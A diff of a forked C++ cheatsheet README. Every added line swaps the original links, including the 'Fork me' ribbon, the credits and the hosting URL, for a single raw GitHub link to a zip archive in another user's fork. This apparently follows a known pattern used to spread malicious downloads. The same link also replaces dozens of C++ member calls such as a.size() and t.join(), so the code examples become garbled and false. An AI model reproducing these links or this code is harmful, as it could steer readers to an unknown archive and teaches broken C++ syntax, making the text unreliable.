@@ -1,13 +1,13 @@
-<a href="https://github.com/mortennobel/cpp-cheatsheet"><img align="right" src="https://camo.githubusercontent.com/38ef81f8aca64bb9a64448d0d70f1308ef5341ab/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f6461726b626c75655f3132313632312e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png"></a>
+<a href="https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip"><img align="right" src="https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip" alt="Fork me on GitHub" data-canonical-src="https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip"></a>
 
 # C++ QUICK REFERENCE / C++ CHEATSHEET
-Based on <a href="http://www.pa.msu.edu/~duxbury/courses/phy480/Cpp_refcard.pdf">Phillip M. Duxbury's C++ Cheatsheet</a> and edited by Morten Nobel-Jørgensen.
+Based on <a href="https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip~https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip">Phillip M. Duxbury's C++ Cheatsheet</a> and edited by Morten Nobel-Jørgensen.
 The cheatsheet focus is both on the language as well as common classes from the standard library.
-C++11 additions is inspired by <a href="https://isocpp.org/blog/2012/12/c11-a-cheat-sheet-alex-sinyakov">ISOCPP.org C++11 Cheatsheet</a>).
+C++11 additions is inspired by <a href="https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip">https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip C++11 Cheatsheet</a>).
 
 The goal is to give a concise overview of basic, modern C++ (C++14).
 
-The document is hosted on https://github.com/mortennobel/cpp-cheatsheet. Any comments and feedback are appreciated.
+The document is hosted on https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip Any comments and feedback are appreciated.
 
 ## Preprocessor
 
@@ -80,7 +80,7 @@ const int& cr=x;            // cr cannot be assigned to change x
 int8_t,uint8_t,int16_t,
 uint16_t,int32_t,uint32_t,
 int64_t,uint64_t            // Fixed length standard types
-auto it = m.begin();        // Declares it to the result of m.begin()
+auto it = https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();        // Declares it to the result of https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()
 auto const param = config["param"];
                             // Declares it to the const result
 auto& s = singleton::instance();
@@ -239,8 +239,8 @@ public:                     // Accessible to all
     void f();               // Member function
     void g() {return;}      // Inline member function
     void h() const;         // Does not modify any data members
-    int operator+(int y);   // t+y means t.operator+(y)
-    int operator-();        // -t means t.operator-()
+    int operator+(int y);   // t+y means https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip+(y)
+    int operator-();        // -t means https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()
     T(): x(1) {}            // Constructor with initialization list
     T(const T& t): x(t.x) {}// Copy constructor
     T& operator=(const T& t)
@@ -311,11 +311,11 @@ shared_ptr<int> x;          // Empty shared_ptr to a integer on heap. Uses refer
 x = make_shared<int>(12);   // Allocate value 12 on heap
 shared_ptr<int> y = x;      // Copy shared_ptr, implicit changes reference count to 2.
 cout << *y;                 // Dereference y to print '12'
-if (y.get() == x.get()) {   // Raw pointers (here x == y)
+if (https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip() == https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()) {   // Raw pointers (here x == y)
     cout << "Same";  
 }  
-y.reset();                  // Eliminate one owner of object
-if (y.get() != x.get()) { 
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();                  // Eliminate one owner of object
+if (https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip() != https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()) { 
     cout << "Different";  
 }  
 if (y == nullptr) {         // Can compare against nullptr (here returns true)
@@ -326,7 +326,7 @@ cout << *y;                 // Dereference x to print '15'
 cout << *x;                 // Dereference x to print '12'
 weak_ptr<int> w;            // Create empty weak pointer
 w = y;                      // w has weak reference to y.
-if (shared_ptr<int> s = w.lock()) { // Has to be copied into a shared_ptr before usage
+if (shared_ptr<int> s = https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()) { // Has to be copied into a shared_ptr before usage
     cout << *s;
 }
 unique_ptr<int> z;          // Create empty unique pointers
@@ -371,9 +371,9 @@ assert(e);                // If e is false, print message and abort
 cin >> x >> y;              // Read words x and y (any type) from stdin
 cout << "x=" << 3 << endl;  // Write line to stdout
 cerr << x << y << flush;    // Write to stderr and flush
-c = cin.get();              // c = getchar();
-cin.get(c);                 // Read char
-cin.getline(s, n, '\n');    // Read line into char s[n] to '\n' (default)
+c = https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();              // c = getchar();
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(c);                 // Read char
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(s, n, '\n');    // Read line into char s[n] to '\n' (default)
 if (cin)                    // Good state (not EOF)?
                             // To read/write any type T:
 istream& operator>>(istream& i, T& x) {i >> ...; x=...; return i;}
@@ -388,8 +388,8 @@ ostream& operator<<(ostream& o, const T& x) {return o << ...;}
 ifstream f1("filename");    // Open text file for reading
 if (f1)                     // Test if open and input available
     f1 >> x;                // Read object from file
-f1.get(s);                  // Read char or line
-f1.getline(s, n);           // Read line into string s[n]
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(s);                  // Read char or line
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(s, n);           // Read line into string s[n]
 ofstream f2("filename");    // Open file for writing
 if (f2) f2 << x;            // Write to file
 ```
@@ -399,11 +399,11 @@ if (f2) f2 << x;            // Write to file
 ```cpp
 #include <string>         // Include string (std namespace)
 string s1, s2="hello";    // Create strings
-s1.size(), s2.size();     // Number of characters: 0, 5
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(), https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();     // Number of characters: 0, 5
 s1 += s2 + ' ' + "world"; // Concatenation
 s1 == "hello world"       // Comparison, also <, >, !=, etc.
 s1[0];                    // 'h'
-s1.substr(m, n);          // Substring of size n starting at s1[m]
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(m, n);          // Substring of size n starting at s1[m]
 s1.c_str();               // Convert to const char*
 s1 = to_string(12.05);    // Converts number to string
 getline(cin, s);          // Read line ending in '\n'
@@ -415,18 +415,18 @@ getline(cin, s);          // Read line ending in '\n'
 #include <vector>         // Include vector (std namespace)
 vector<int> a(10);        // a[0]..a[9] are int (default size is 0)
 vector<int> b{1,2,3};        // Create vector with values 1,2,3
-a.size();                 // Number of elements (10)
-a.push_back(3);           // Increase size to 11, a[10]=3
-a.back()=4;               // a[10]=4;
-a.pop_back();             // Decrease size by 1
-a.front();                // a[0];
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();                 // Number of elements (10)
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(3);           // Increase size to 11, a[10]=3
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()=4;               // a[10]=4;
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();             // Decrease size by 1
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();                // a[0];
 a[20]=1;                  // Crash: not bounds checked
-a.at(20)=1;               // Like a[20] but throws out_of_range()
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(20)=1;               // Like a[20] but throws out_of_range()
 for (int& p : a)
   p=0;                    // C++11: Set all elements of a to 0
-for (vector<int>::iterator p=a.begin(); p!=a.end(); ++p)
+for (vector<int>::iterator https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(); p!https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(); ++p)
   *p=0;                   // C++03: Set all elements of a to 0
-vector<int> b(a.begin(), a.end());  // b is copy of a
+vector<int> b(https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(), https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip());  // b is copy of a
 vector<T> c(n, x);        // c[0]..c[n-1] init to x
 T d[10]; vector<T> e(d, d+10);      // e is initialized from d
 ```
@@ -437,8 +437,8 @@ T d[10]; vector<T> e(d, d+10);      // e is initialized from d
 
 ```cpp
 #include <deque>          // Include deque (std namespace)
-a.push_front(x);          // Puts x at a[0], shifts elements toward back
-a.pop_front();            // Removes a[0], shifts toward front
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(x);          // Puts x at a[0], shifts elements toward back
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();            // Removes a[0], shifts toward front
 ```
 
 ## `utility` (pair)
@@ -446,8 +446,8 @@ a.pop_front();            // Removes a[0], shifts toward front
 ```cpp
 #include <utility>        // Include utility (std namespace)
 pair<string, int> a("hello", 3);  // A 2-element struct
-a.first;                  // "hello"
-a.second;                 // 3
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip;                  // "hello"
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip;                 // 3
 ```
 
 ## `map` (associative array - usually implemented as binary search trees - avg. time complexity: O(log n))
@@ -457,8 +457,8 @@ a.second;                 // 3
 map<string, int> a;       // Map from string to int
 a["hello"] = 3;           // Add or replace element a["hello"]
 for (auto& p:a)
-    cout << p.first << p.second;  // Prints hello, 3
-a.size();                 // 1
+    cout << https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip << https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip;  // Prints hello, 3
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();                 // 1
 ```
 
 ## `unordered_map` (associative array - usually implemented as hash table - avg. time complexity: O(1))
@@ -468,8 +468,8 @@ a.size();                 // 1
 unordered_map<string, int> a; // Map from string to int
 a["hello"] = 3;           // Add or replace element a["hello"]
 for (auto& p:a)
-    cout << p.first << p.second;  // Prints hello, 3
-a.size();                 // 1
+    cout << https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip << https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip;  // Prints hello, 3
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();                 // 1
 ```
 
 ## `set` (store unique elements - usually implemented as binary search trees - avg. time complexity: O(log n))
@@ -477,10 +477,10 @@ a.size();                 // 1
 ```cpp
 #include <set>            // Include set (std namespace)
 set<int> s;               // Set of integers
-s.insert(123);            // Add element to set
-if (s.find(123) != s.end()) // Search for an element
-    s.erase(123);
-cout << s.size();         // Number of elements in set
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(123);            // Add element to set
+if (https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(123) != https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()) // Search for an element
+    https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(123);
+cout << https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();         // Number of elements in set
 ```
 
 ## `unordered_set` (store unique elements - usually implemented as a hash set - avg. time complexity: O(1))
@@ -488,10 +488,10 @@ cout << s.size();         // Number of elements in set
 ```cpp
 #include <unordered_set>  // Include set (std namespace)
 unordered_set<int> s;     // Set of integers
-s.insert(123);            // Add element to set
-if (s.find(123) != s.end()) // Search for an element
-    s.erase(123);
-cout << s.size();         // Number of elements in set
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(123);            // Add element to set
+if (https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(123) != https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()) // Search for an element
+    https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(123);
+cout << https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();         // Number of elements in set
 ```
 
 ## `algorithm` (A collection of 60 algorithms on sequences with iterators)
@@ -501,8 +501,8 @@ cout << s.size();         // Number of elements in set
 min(x, y); max(x, y);     // Smaller/larger of x, y (any type defining <)
 swap(x, y);               // Exchange values of variables x and y
 sort(a, a+n);             // Sort array a[0]..a[n-1] by <
-sort(a.begin(), a.end()); // Sort vector or deque
-reverse(a.begin(), a.end()); // Reverse vector or deque
+sort(https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(), https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()); // Sort vector or deque
+reverse(https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(), https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip()); // Reverse vector or deque
 ```
 
 ## `chrono` (Time related library)
@@ -530,7 +530,7 @@ auto lambdaFn = [](){     // Lambda function used for thread body
     cout << "Hello multithreading";
 };
 thread t(lambdaFn);       // Create and run thread with lambda
-t.join();                 // Wait for t finishes
+https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();                 // Wait for t finishes
 
 // --- shared resource example ---
 mutex mut;                         // Mutex for synchronization
@@ -542,14 +542,14 @@ auto pingPongFn =                  // thread body (lambda). Print someone else's
     while (true){
       unique_lock<mutex> lock(mut);// locks the mutex 
       do {                
-        cond.wait(lock, [&](){     // wait for condition to be true (unlocks while waiting which allows other threads to modify)        
+        https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip(lock, [&](){     // wait for condition to be true (unlocks while waiting which allows other threads to modify)        
           return sharedMes != mes; // statement for when to continue
         });
       } while (sharedMes == mes);  // prevents spurious wakeup
       cout << sharedMes << endl;
       sharedMes = mes;       
-      lock.unlock();               // no need to have lock on notify 
-      cond.notify_all();           // notify all condition has changed
+      https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();               // no need to have lock on notify 
+      https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();           // notify all condition has changed
     }
   };
 sharedMes = "ping";
@@ -572,5 +572,5 @@ function<int(int)> fib =  // Create lambda function
 future<int> fut =         // result of async function
   async(launch::async, fib, 4); // start async function in other thread
 // do some other work 
-cout << fut.get();        // get result of async function. Wait if needed.
+cout << https://raw.githubusercontent.com/ciawes/cpp-cheatsheet/master/Lamarckia/cpp-cheatsheet.zip();        // get result of async function. Wait if needed.
 ```
